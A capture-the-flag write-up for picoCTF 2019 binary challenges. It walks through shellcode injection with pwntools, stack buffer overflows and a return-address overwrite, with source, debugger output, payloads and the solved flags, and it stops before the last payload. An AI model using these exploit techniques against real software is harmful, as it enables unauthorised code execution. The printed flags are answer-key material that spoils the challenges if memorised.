<center><h1>Binary</h1></center>
<br><br>
<center><h2>handy-shellcode [50]</h2></center>
<br>
Q: This *[program](/picoctf2019/files/handyShellcodeVuln)* executes any shellcode that you give it. Can you spawn a shell and use that to read the flag.txt? You can find the program in /problems/handy-shellcode_1_ebc60746fee43ae25c405fc75a234ef5 on the shell server. *[Source](/picoctf2019/files/handyShellcodeVuln.c)*.

A: It tells us exactly what to do. Easiest way to spawn a shell would be to use pwn tools with python. Log into the shell server and navigate to ```/problems/handy-shellcode_1_ebc60746fee43ae25c405fc75a234ef5``` which is where the ```vuln``` binary and ```flag.txt``` are stored. Here we are going to spawn our shell. Using the 4 lines of python code below we are able to grab the flag.
```
# cd /problems/handy-shellcode_1_ebc60746fee43ae25c405fc75a234ef5
/problems/handy-shellcode_1_ebc60746fee43ae25c405fc75a234ef5$ python
>>> from pwn import *
>>> sh = process('./vuln')
[x] Starting local process './vuln'
[+] Starting local process './vuln': pid 2276666
>>> sh.sendlineafter(':\n', asm(shellcraft.i386.linux.sh()))
'Enter your shellcode'
>>> sh.interactive()
[*] Switching to interactive mode
jhh///sh/bin��h�4$ri1�QjY�Q��1�j
                                X̀
Thanks! Executing now...

cat flag.txt
picoCTF{h4ndY_d4ndY_sh311c0d3_2cb0ff39}
```
Flag:```picoCTF{h4ndY_d4ndY_sh311c0d3_2cb0ff39}```
<br>
<center><h2>practice-run-1 [50]</h2></center>
<br>
Q: You're going to need to know how to run programs if you're going to get out of here. Navigate to /problems/practice-run-1_0_62b61488e896645ebff9b6c97d0e775e on the shell server and run this *[program](/picoctf2019/files/run_this)* to receive a flag.

A: Two ways to do this.
1. Navigate to ```/problems/practice-run-1_0_62b61488e896645ebff9b6c97d0e775e``` and execute the program
```
# ./run_this
picoCTF{g3t_r3adY_2_r3v3r53}
```
2. Download the file to your computer, make the file executable and then run it.
```
# chmod +x run_this
# ./run_this
picoCTF{g3t_r3adY_2_r3v3r53}
```
Flag:```picoCTF{g3t_r3adY_2_r3v3r53}```
<br>
<center><h2>Overflow 0 [100]</h2></center>
<br>
Q: This should be easy. Overflow the correct buffer in this *[program](/picoctf2019/files/overflow0Vuln)* and get a flag. Its also found in /problems/overflow-0_3_dc6e55b8358f1c82f03ddd018a5549e0 on the shell server. *[Source](/picoctf2019/files/overflow0Vuln.c)*.

A: So this problem is actually very basic buffer overflow. Looking at the code we see that in the ```vuln``` function the ```buf``` variable was given 128 bytes of memory.
```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>

#define FLAGSIZE_MAX 64

char flag[FLAGSIZE_MAX];

void sigsegv_handler(int sig) {
  fprintf(stderr, "%s\n", flag);
  fflush(stderr);
  exit(1);
}

void vuln(char *input){
  char buf[128];
  strcpy(buf, input);
}

int main(int argc, char **argv){

  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.\n");
    exit(0);
  }
  fgets(flag,FLAGSIZE_MAX,f);
  signal(SIGSEGV, sigsegv_handler);

  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  if (argc > 1) {
    vuln(argv[1]);
    printf("You entered: %s", argv[1]);
  }
  else
    printf("Please enter an argument next time\n");
  return 0;
}
```
Knowing this, if we input the program more data than it can handle it will cause it to spit out the flag. You could just enter 500 characters and be done with it but the exact number is 133 characters. The reason it is 133 and not 128 is simple. The program allocated 128 bytes of memory for the input but thats not all we have to overwrite. We also have to overwrite the memory address which on 32 bit architectures are 4 bytes long. So, 128 + 4 = 132 and we need to be greater than which is why 133 is the smallest number that can cause a buffer overflow.
```
# python -c 'print("A" * 133)' AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
# ./vuln AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
picoCTF{3asY_P3a5y1fcf81f9}
```
Flag:```picoCTF{3asY_P3a5y1fcf81f9}```
<br>
<center><h2>Overflow 1 [150]</h2></center>
<br>
Q: You beat the first overflow challenge. Now overflow the buffer and change the return address to the flag function in this *[program](/picoctf2019/files/overflow1Vuln)*? You can find it in /problems/overflow-1_0_48b13c56d349b367a4d45d7d1aa31780 on the shell server. *[Source](/picoctf2019/files/overflow0Vuln.c)*.

A: So this problem required a little bit more work. So the question tells us that we have to change the return address to the flag function. Taking a look at the source code we do indeed see a flag function that reeds the ```flag.txt``` file.
```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include "asm.h"

#define BUFFSIZE 64
#define FLAGSIZE 64

void flag() {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("Flag File is Missing. please contact an Admin if you are running this on the shell server.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  printf(buf);
}

void vuln(){
  char buf[BUFFSIZE];
  gets(buf);

  printf("Woah, were jumping to 0x%x !\n", get_return_address());
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  gid_t gid = getegid();
  setresgid(gid, gid, gid);
  puts("Give me a string and lets see what happens: ");
  vuln();
  return 0;
}
```
Now first step is to find the offset of the binary. This is kind of like the place in line where the program runs out of memory. There are a few ways to do this but I will use pwntools.

First I generate a random string of characters.
```
>>> from pwn import *
>>> cyclic(100)
'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa'
```
Second, I execute the binary and input the random string of characters
```
# ./vuln
Give me a string and lets see what happens:
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
Woah, were jumping to 0x61616174 !
Segmentation fault
```
Lastly, I will use pwntools again to get the the exact location of the offset. in this case it is 76
```
>>> from pwn import *
>>> cyclic_find(p32(0x61616174))
76
```
Next we need to grab the address of the ```flag``` function. This can be done using ```Radare2```.
```
# r2 vuln
[0x080484d0]> aaaa
[x] Analyze all flags starting with sym. and entry0 (aa)
[x] Analyze function calls (aac)
[x] Analyze len bytes of instructions for references (aar)
[x] Constructing a function name for fcn.* and sym.func.* functions (aan)
[x] Enable constraint types analysis for variables
[0x080484d0]> afl
    ...
    ...
0x080485e6    3 121          sym.flag
    ...
    ...
[0x080484d0]> q
```
Now we have all we need to get the flag. On the shell server, navigate to ```/problems/overflow-1_0_48b13c56d349b367a4d45d7d1aa31780```.

To create our payload we of course are going to use pwntools. First we are going to take ```A``` and multiply it by our offset of ```76``` to fill up the buffer space. Next we are going to add the address of our flag function. We can't just add it like ```0x080485e6``` or ```\x08\x04\x65\xe6``` because it would throw an error since its not in the correct format. We need to put it in Little Endian format which is basically reversing it. ```\xe6\x85\x04\x08```. Now if we put everything together, we get a command like the one below and when executed, we get the flag.
```
$ python -c "from pwn import *; print 'A' * 76 + '\xe6\x85\x04\x08'" | ./vuln
Give me a string and lets see what happens:
Woah, were jumping to 0x80485e6 !
picoCTF{n0w_w3r3_ChaNg1ng_r3tURn5c0178710}
Segmentation fault (core dumped)
```
Flag:```picoCTF{n0w_w3r3_ChaNg1ng_r3tURn5c0178710}```
<br>
<center><h2>OverFlow 2 [250]</h2></center>
<br>
Q: This *[program](/picoctf2019/files/overflow2Vuln)* is a little bit more tricky. Can you spawn a shell and use that to read the flag.txt? You can find the program in /problems/slippery-shellcode_3_68613021756bf004b625d7b414243cd8 on the shell server. *[Source}(overflow2Vuln.c)*.

A: This problem is similar to Overflow 1 where we need to take the address of the ```flag``` function and overwrite the original return address with the ```flag``` function. Lets take a look at the source code.
```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>

#define BUFSIZE 176
#define FLAGSIZE 64

void flag(unsigned int arg1, unsigned int arg2) {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  if (arg1 != 0xDEADBEEF)
    return;
  if (arg2 != 0xC0DED00D)
    return;
  printf(buf);
}

void vuln(){
  char buf[BUFSIZE];
  gets(buf);
  puts(buf);
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);

  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  puts("Please enter your string: ");
  vuln();
  return 0;
}
```
So the difference between this challenge and Overflow 1 is that not only do we have to overwrite the return address on the stack, we also need to pass two arguments while calling the ```flag``` function. First lets start by getting the offset. This time I will use ```gdb```.

First I will create a pattern of 200 random characters.
```
# gdb -q vuln
Reading symbols from vuln...
(No debugging symbols found in vuln)
gdb-peda$ pattern_create 200
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA'
```
Second, I will run the program and use those characters as input for the program causing it to seg fault
```
gdb-peda$ r
Starting program: /root/Downloads/vuln
Please enter your string:
AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA
AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
EAX: 0xc9
EBX: 0x76414158 ('XAAv')
ECX: 0xf7fb0010 --> 0x0
EDX: 0xc9
ESI: 0xf7fae000 --> 0x1d6d6c
EDI: 0xf7fae000 --> 0x1d6d6c
EBP: 0x41594141 ('AAYA')
ESP: 0xffffd340 ("ZAAxAAyA")
EIP: 0x41417741 ('AwAA')
EFLAGS: 0x10282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x41417741
[------------------------------------stack-------------------------------------]
0000| 0xffffd340 ("ZAAxAAyA")
0004| 0xffffd344 ("AAyA")
0008| 0xffffd348 --> 0xffffd400 --> 0x1
0012| 0xffffd34c --> 0x0
0016| 0xffffd350 --> 0xffffd370 --> 0x1
0020| 0xffffd354 --> 0x0
0024| 0xffffd358 --> 0x0
0028| 0xffffd35c --> 0xf7df57e1 (<__libc_start_main+241>:	add    esp,0x10)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x41417741 in ?? ()
gdb-peda$
```
Third, I am going to grab the pattern from the ```EBP``` which in my case is ```AAYA```. Then I am going to use the ```pattern search``` function to find where that pattern is on the stack. We want the ```EIP``` which here is located at ```188```
```
db-peda$ pattern search AAYA
Registers contain pattern buffer:
EBX+0 found at offset: 180
EBP+0 found at offset: 184
EIP+0 found at offset: 188   <----- offset
```
Now we need to grab the address of the ```flag``` function. We can use ```Radare2``` again to obtain the address.
```
# r2 vuln
[0x080484d0]> aaaa
[x] Analyze all flags starting with sym. and entry0 (aa)
[x] Analyze function calls (aac)
[x] Analyze len bytes of instructions for references (aar)
[x] Constructing a function name for fcn.* and sym.func.* functions (aan)
[x] Enable constraint types analysis for variables
[0x080484d0]> afl
    ...
    ...
0x080485e6    8 144          sym.flag
    ...
    ...
[0x080484d0]> q
```
Now we have everything to build our payload.
